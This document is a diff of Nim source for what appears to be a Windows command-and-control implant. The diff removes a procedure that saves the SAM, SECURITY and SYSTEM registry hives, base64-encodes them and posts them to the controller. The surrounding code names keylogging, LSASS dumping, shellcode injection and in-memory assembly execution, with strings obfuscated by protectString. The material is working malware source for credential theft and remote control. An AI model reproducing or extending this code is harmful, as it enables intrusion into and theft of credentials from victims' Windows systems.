@@ -37,7 +37,6 @@ proc wrap_keylog_stop(): bool
 proc wrap_examine_lsass(): bool
 proc dump_lsass(dump_method: string): bool
 proc wrap_evil_lsass_twin(): bool
-proc dump_sam(): bool
 proc wrap_inject_shellc(shellc_base64: string, pid: int): bool
 proc wrap_execute_assembly(assembly_base64: string, assembly_args: string): bool
 proc wrap_patch_func(func_name: string): bool
@@ -396,52 +395,6 @@ proc wrap_evil_lsass_twin(): bool =
     return is_success
 
 
-proc dump_sam(): bool =
-    var is_success: bool
-    var sam_base64: string
-    var sec_base64: string
-    var sys_base64: string
-    var sam_file = protectString("s.am")
-    var sec_file = protectString("s.ec")
-    var sys_file = protectString("s.ys")
-
-    if execCmdEx(protectString("reg.exe save hklm\\sam ") & sam_file, options={poDaemon}).exitCode == 0 and 
-    execCmdEx(protectString("reg.exe save hklm\\security ") & sec_file, options={poDaemon}).exitCode == 0 and 
-    execCmdEx(protectString("reg.exe save hklm\\system ") & sys_file, options={poDaemon}).exitCode == 0:
-        is_success = true
-    else:
-        is_success = false
-
-    sleep(3000)
-
-    try:
-        sam_base64 = encode_64(readFile(sam_file), is_bin=true)
-        sec_base64 = encode_64(readFile(sec_file), is_bin=true)
-        sys_base64 = encode_64(readFile(sys_file), is_bin=true)
-        is_success = true
-    except:
-        sam_base64 = could_not_retrieve
-        sec_base64 = could_not_retrieve
-        sys_base64 = could_not_retrieve
-        is_success = false
-
-    try:
-        removeFile(sam_file)
-        removeFile(sec_file)
-        removeFile(sys_file)
-    except:
-        discard
-    
-    var data = {
-        protectString("is_success"): $is_success,
-        protectString("sam_base64"): sam_base64,
-        protectString("sec_base64"): sec_base64,
-        protectString("sys_base64"): sys_base64
-    }.toOrderedTable
-
-    is_success = post_data(client, protectString("sam") , $data)
-
-
 proc wrap_inject_shellc(shellc_base64: string, pid: int): bool =
 
     var shellc_bytes = to_bytes(decode_64(shellc_base64, is_bin=true))
@@ -712,8 +665,6 @@ proc windows_parse_command*(command: JsonNode): bool =
                 is_success = wrap_evil_lsass_twin()
             else:
                 is_success = dump_lsass(dump_method)
-        of protectString("sam"):
-            is_success = dump_sam()
         of protectString("shellc"):
             is_success = wrap_inject_shellc(command[protectString("shellc_base64")].getStr(), command[protectString("pid")].getInt())
         of protectString("assembly"):
